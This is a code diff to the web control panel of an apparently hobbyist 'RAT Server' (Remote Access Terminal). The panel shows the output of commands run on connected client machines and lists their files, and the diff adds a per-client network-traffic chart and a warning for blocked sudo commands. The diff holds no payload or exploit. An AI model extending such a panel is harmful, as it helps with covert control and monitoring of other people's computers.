@@ -201,6 +201,7 @@
         .panel-icon.clients { background: var(--accent-blue); color: white; }
         .panel-icon.terminal { background: var(--accent-purple); color: white; }
         .panel-icon.files { background: var(--accent-amber); color: white; }
+        .panel-icon.network { background: var(--accent-green); color: white; }
 
         .panel-title {
             font-size: clamp(0.875rem, 2.5vw, 1.1rem);
@@ -423,6 +424,25 @@
             margin: clamp(1rem, 3vw, 1.5rem) 0;
         }
 
+        .sudo-warning {
+            background: rgba(239, 68, 68, 0.1);
+            border: 1px solid var(--accent-red);
+            border-radius: 0.5rem;
+            padding: 0.75rem;
+            color: var(--accent-red);
+            font-size: 0.85rem;
+            margin-bottom: 1rem;
+            text-align: center;
+        }
+
+        .network-graph {
+            height: clamp(200px, 40vh, 300px);
+            background: rgba(10, 14, 26, 0.5);
+            border: 1px solid var(--border-primary);
+            border-radius: 0.75rem;
+            padding: 1rem;
+        }
+
         /* Scrollbar Styling */
         ::-webkit-scrollbar {
             width: 0.5rem;
@@ -460,7 +480,7 @@
                 max-height: 200px;
             }
 
-            .output-container {
+            .output-container, .network-graph {
                 height: 200px;
             }
 
@@ -471,6 +491,7 @@
         }
     </style>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.5/socket.io.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.4/dist/chart.umd.min.js"></script>
 </head>
 <body>
     <div class="background-pattern"></div>
@@ -481,6 +502,11 @@
             <h1>Yuno's RAT Server</h1>
             <div class="subtitle">Remote Access Terminal - Professional Interface</div>
             <div class="credits">Made by Izumi</div>
+        </div>
+
+        <!-- Warning -->
+        <div class="sudo-warning" id="sudo-warning" style="display: none;">
+            Warning: sudo commands are blocked in this environment. Use non-root commands instead.
         </div>
 
         <!-- Status Panel -->
@@ -569,6 +595,19 @@
             </div>
         </div>
 
+        <!-- Network Traffic Panel -->
+        <div class="panel">
+            <div class="panel-header">
+                <div class="panel-icon network">N</div>
+                <div class="panel-title">Network Traffic Monitor</div>
+            </div>
+            <div class="panel-content">
+                <div class="network-graph">
+                    <canvas id="network-chart"></canvas>
+                </div>
+            </div>
+        </div>
+
         <!-- Files Panel -->
         <div class="panel">
             <div class="panel-header">
@@ -607,6 +646,81 @@
         const clientSelect = document.getElementById('client-select');
         const clientCount = document.getElementById('client-count');
         const filesList = document.getElementById('files-list');
+        const sudoWarning = document.getElementById('sudo-warning');
+
+        // Initialize Chart.js for network traffic
+        const ctx = document.getElementById('network-chart').getContext('2d');
+        const networkChart = new Chart(ctx, {
+            type: 'line',
+            data: {
+                labels: [], // Timestamps
+                datasets: [
+                    {
+                        label: 'Sent Speed (Mbps)',
+                        data: [],
+                        borderColor: 'rgba(2, 132, 199, 1)',
+                        backgroundColor: 'rgba(2, 132, 199, 0.2)',
+                        fill: true,
+                        tension: 0.4
+                    },
+                    {
+                        label: 'Received Speed (Mbps)',
+                        data: [],
+                        borderColor: 'rgba(124, 58, 237, 1)',
+                        backgroundColor: 'rgba(124, 58, 237, 0.2)',
+                        fill: true,
+                        tension: 0.4
+                    }
+                ]
+            },
+            options: {
+                scales: {
+                    x: {
+                        display: true,
+                        title: {
+                            display: true,
+                            text: 'Time',
+                            color: '#b3c4d8'
+                        },
+                        ticks: {
+                            color: '#6b7280',
+                            maxTicksLimit: 10
+                        },
+                        grid: {
+                            color: 'rgba(55, 65, 81, 0.2)'
+                        }
+                    },
+                    y: {
+                        beginAtZero: true,
+                        title: {
+                            display: true,
+                            text: 'Speed (Mbps)',
+                            color: '#b3c4d8'
+                        },
+                        ticks: {
+                            color: '#6b7280'
+                        },
+                        grid: {
+                            color: 'rgba(55, 65, 81, 0.2)'
+                        }
+                    }
+                },
+                plugins: {
+                    legend: {
+                        labels: {
+                            color: '#b3c4d8'
+                        }
+                    }
+                },
+                animation: {
+                    duration: 500 // Smooth transitions
+                }
+            }
+        });
+
+        // Network data storage for each client
+        const networkDataMap = new Map();
+        const MAX_DATA_POINTS = 20; // Limit to last 20 points for smooth scrolling
 
         socket.on('client_update', (clients) => {
             clientsList.innerHTML = '';
@@ -661,6 +775,49 @@
             const newOutput = `[${timestamp}] ${username} (${clientId}) executed "${command}":\n${output}\n\n`;
             outputDiv.textContent += newOutput;
             outputDiv.scrollTop = outputDiv.scrollHeight;
+
+            // Show warning if sudo failed
+            if (output.includes("sudo is blocked")) {
+                sudoWarning.style.display = 'block';
+            }
+        });
+
+        socket.on('network_data', (data) => {
+            const clientId = data.client_id;
+            const timestamp = new Date(data.timestamp * 1000).toLocaleTimeString();
+            const sentSpeed = data.sent_speed_mbps;
+            const recvSpeed = data.recv_speed_mbps;
+
+            if (clientId === selectedClient) {
+                // Update chart for the selected client
+                networkChart.data.labels.push(timestamp);
+                networkChart.data.datasets[0].data.push(sentSpeed);
+                networkChart.data.datasets[1].data.push(recvSpeed);
+
+                // Keep only the last MAX_DATA_POINTS
+                if (networkChart.data.labels.length > MAX_DATA_POINTS) {
+                    networkChart.data.labels.shift();
+                    networkChart.data.datasets[0].data.shift();
+                    networkChart.data.datasets[1].data.shift();
+                }
+
+                networkChart.update();
+            }
+
+            // Store data for switching clients
+            if (!networkDataMap.has(clientId)) {
+                networkDataMap.set(clientId, { labels: [], sent: [], recv: [] });
+            }
+            const clientData = networkDataMap.get(clientId);
+            clientData.labels.push(timestamp);
+            clientData.sent.push(sentSpeed);
+            clientData.recv.push(recvSpeed);
+
+            if (clientData.labels.length > MAX_DATA_POINTS) {
+                clientData.labels.shift();
+                clientData.sent.shift();
+                clientData.recv.shift();
+            }
         });
 
         // Update time
@@ -690,6 +847,13 @@
                 item.classList.add('selected');
                 selectedClient = item.getAttribute('data-client-id');
                 clientSelect.value = selectedClient;
+
+                // Update chart for the selected client
+                const clientData = networkDataMap.get(selectedClient) || { labels: [], sent: [], recv: [] };
+                networkChart.data.labels = clientData.labels;
+                networkChart.data.datasets[0].data = clientData.sent;
+                networkChart.data.datasets[1].data = clientData.recv;
+                networkChart.update();
             });
         });
 
